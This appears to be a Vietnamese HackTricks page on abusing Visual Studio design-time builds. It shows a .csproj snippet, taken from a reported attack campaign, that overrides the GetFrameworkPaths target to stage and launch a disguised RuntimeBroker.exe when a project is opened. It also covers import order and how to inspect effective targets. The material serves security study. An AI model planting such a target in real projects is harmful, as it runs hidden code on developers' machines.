# Thực thi MSBuild trong thời gian thiết kế của dự án Visual Studio

{{#include ../banners/hacktricks-training.md}}

Mở một dự án C# trong Visual Studio không phải là thao tác chỉ đọc. Bản dựng trong thời gian thiết kế sẽ gọi các target MSBuild có tên để khởi tạo IntelliSense, references và debugging **trước khi** nhà phát triển chọn Build hoặc Run. `GetFrameworkPaths` là một trong những target đó. Một dự án định nghĩa lại target này có thể biến việc tải dự án thành thực thi mã trong ngữ cảnh người dùng mà không cần nhấp vào payload riêng.<sup>[[1]](#references)[[2]](#references)</sup>

Dự án được báo cáo khai báo các tệp tài nguyên, sau đó dùng `MakeDir`, `Copy` và `Exec` bên trong target được thay thế để chuẩn bị và khởi chạy payload đặt cùng thư mục. Đoạn trích rút gọn này giữ nguyên luồng thực thi được minh họa trong Figure 6 của nguồn; nó phải nằm trong một tệp `.csproj`, không phải một tệp XML độc lập.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Thứ tự import rất quan trọng:** MSBuild sử dụng định nghĩa *cuối cùng* của một target. Không đảm bảo target được viết trong tệp project sẽ thay thế target của Microsoft nếu một import sau đó định nghĩa lại target này. Các project theo kiểu SDK sử dụng `<Project Sdk="...">` sẽ ngầm import các target của SDK sau phần thân project, vì vậy hãy kiểm tra thứ tự import sau khi đánh giá thay vì cho rằng cách ghi đè chính xác này sẽ hoạt động trong mọi project. `MSBuild.exe -preprocess:expanded.xml project.csproj` mở rộng các import mà không build project và có thể giúp xác định định nghĩa target đang có hiệu lực.<sup>[[3]](#references)[[4]](#references)</sup>

Đây là một bề mặt thực thi trong project dành cho nhà phát triển, không phải cài đặt tiện ích mở rộng VSIX và bản thân nó không phải là leo thang đặc quyền. Nếu executable được đặt vào thư mục staging sử dụng tệp `.exe.config` hoặc DLL độc hại nằm cạnh nó, hãy tiếp tục với [chiếm quyền điều khiển AppDomainManager và DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Chiến dịch Blinder Tunnel nhắm vào hạ tầng Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Tích hợp Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - Các target của MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - Tham chiếu dòng lệnh MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
